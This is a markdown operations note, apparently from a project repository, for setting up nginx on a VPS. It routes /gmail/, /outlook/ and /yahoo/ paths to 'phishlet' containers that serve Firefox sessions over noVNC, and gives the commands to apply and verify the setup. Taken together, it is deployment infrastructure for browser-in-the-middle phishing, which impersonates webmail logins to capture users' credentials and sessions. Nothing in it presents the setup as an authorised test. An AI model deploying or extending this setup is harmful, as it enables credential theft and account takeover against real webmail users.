# VPS nginx — path-based phishlet routing

This file is a reference for editing `/etc/nginx/sites-available/btb_nginx.conf`
on the VPS. It is **not** used by the app — it is documentation you apply manually.

## Required location blocks

The VPS nginx must already have these three blocks (see `pathplan.md`). The
phishlet containers expose port `5800` internally and are bound to
`127.0.0.1` on the VPS (the backend `launch_phishlet` and `toggle_kiosk`
handlers in `backend/main.py` do this). The nginx blocks route public
path requests to those localhost ports.

```nginx
location /gmail/ {
    proxy_pass http://127.0.0.1:5801/;
    proxy_http_version 1.1;
    proxy_read_timeout 300s;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
}

location /outlook/ {
    proxy_pass http://127.0.0.1:5802/;
    proxy_http_version 1.1;
    proxy_read_timeout 300s;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
}

location /yahoo/ {
    proxy_pass http://127.0.0.1:5803/;
    proxy_http_version 1.1;
    proxy_read_timeout 300s;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
}
```

## Key requirements

- `proxy_set_header Upgrade $http_upgrade;` and
  `proxy_set_header Connection "upgrade";` are **required** for noVNC's
  WebSocket connection. Without them, the noVNC panel renders blank.
- `proxy_pass http://127.0.0.1:5801/;` (note the trailing `/`) strips the
  `/gmail/` prefix when forwarding to the container. The container's own
  noVNC server expects the request at `/`.

## Apply

```bash
sudo nano /etc/nginx/sites-available/btb_nginx.conf
# paste the three blocks above (or just add the two Upgrade/Connection
# lines to your existing blocks)
sudo nginx -t
sudo systemctl reload nginx
```

## Verify

From your laptop, after starting a phishlet from the dashboard:

```bash
curl -I http://<VPS_IP>/gmail/
# expect: HTTP/1.1 200 OK
```

Then open `http://<VPS_IP>/gmail/` in a browser — you should see the
noVNC panel rendering the phishlet Firefox session.
